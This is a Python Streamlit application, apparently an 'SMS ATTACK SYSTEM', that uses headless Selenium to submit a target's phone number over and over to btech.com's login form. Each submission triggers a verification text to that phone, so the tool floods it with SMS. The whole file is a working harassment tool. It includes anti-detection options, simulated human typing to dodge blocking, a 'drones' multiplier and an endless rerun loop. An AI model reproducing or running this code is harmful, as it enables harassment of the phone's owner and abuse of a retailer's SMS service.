import streamlit as st
import time
import random
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# --- إعدادات الواجهة (نفس ثيم الأخضر والأسود) ---
st.set_page_config(page_title="ULTIMATE SMS SNIPER v8.0", page_icon="⚡")

st.markdown("""
    <style>
    .stApp { background-color: #0e1117; color: #2ecc71; }
    .stButton>button { background-color: #27ae60; color: white; border-radius: 8px; height: 3em; font-weight: bold; }
    .stTextInput>div>div>input { background-color: #1e1e1e; color: #2ecc71; border: 1px solid #27ae60; }
    .log-container { background-color: #000000; color: #00ff00; padding: 10px; border-radius: 5px; font-family: 'Consolas', monospace; }
    </style>
    """, unsafe_allow_html=True)

# تهيئة مخزن البيانات (Session State)
if 'count' not in st.session_state: st.session_state.count = 0
if 'logs' not in st.session_state: st.session_state.logs = []
if 'running' not in st.session_state: st.session_state.running = False

def add_log(message):
    now = datetime.now().strftime("%H:%M:%S")
    st.session_state.logs.append(f"[{now}] {message}")
    if len(st.session_state.logs) > 15: st.session_state.logs.pop(0)

def run_btech_cycle(phone, drone_id):
    options = Options()
    options.add_argument("--headless=new") # ضروري جداً للسيرفر
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    
    driver = None
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        wait = WebDriverWait(driver, 20)
        
        # 1. فتح السيرفر
        add_log(f"Drone-{drone_id}: Opening B.TECH Servers...")
        driver.get("https://btech.com/ar/account")
        
        # 2. الضغط على زر تسجيل الدخول (نفس الـ XPATH بتاعك)
        add_log(f"Drone-{drone_id}: Clicking Login/Register...")
        login_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'تسجيل دخول') or contains(., 'إنشاء حساب')]")))
        driver.execute_script("arguments[0].click();", login_btn)
        
        # 3. إدخال الرقم (نفس الـ ID بتاعك)
        add_log(f"Drone-{drone_id}: Injecting SMS to {phone}...")
        phone_input = wait.until(EC.presence_of_element_located((By.ID, "phone")))
        
        # محاكاة الكتابة البشرية لتجنب البلوك
        for char in phone:
            phone_input.send_keys(char)
            time.sleep(0.1)
        
        phone_input.send_keys("\ue007") # الضغط على Enter
        
        time.sleep(4) # انتظار استجابة السيرفر
        st.session_state.count += 1
        add_log(f"Drone-{drone_id}: 🔥 SUCCESS! Hit confirmed.")
        
    except Exception as e:
        add_log(f"Drone-{drone_id}: ⚠️ Thread Busy... Retrying.")
    finally:
        if driver: driver.quit()

# --- واجهة المستخدم ---
st.title("⚡ SMS ATTACK SYSTEM")
st.write("All Rights Reserved to Mahmoud Abdalla")

phone_number = st.text_input("Target Phone Number", placeholder="01xxxxxxxxx")
multiplier = st.select_slider("Select Multiplier (Drones)", options=[1, 2, 3, 5, 10], value=1)

col1, col2 = st.columns(2)

if col1.button("🚀 LAUNCH ATTACK"):
    if phone_number:
        st.session_state.running = True
        add_log(f"--- ATTACK INITIALIZED ON {phone_number} ---")
    else:
        st.error("Please enter a target number!")

if col2.button("🛑 TERMINATE ALL"):
    st.session_state.running = False
    add_log("--- SYSTEM SHUTDOWN ---")

st.divider()

# الإحصائيات الحية
c1, c2 = st.columns(2)
c1.metric("TOTAL HITS", st.session_state.count)
c2.metric("STATUS", "ACTIVE 🔥" if st.session_state.running else "IDLE 💤")

# صندوق اللوجز (بنفس شكل كود الـ Desktop)
st.subheader("Ghost Logs")
log_text = "\n".join(st.session_state.logs[::-1])
st.text_area(label="Terminal Output", value=log_text, height=250, disabled=True, label_visibility="collapsed")

# حلقة التشغيل
if st.session_state.running:
    # بدلاً من الـ Threading المعقد بتاع الويندوز، بنستخدم Loop سريع في Streamlit
    for _ in range(multiplier):
        run_btech_cycle(phone_number, random.randint(1, 99))
    time.sleep(1)
    st.rerun()
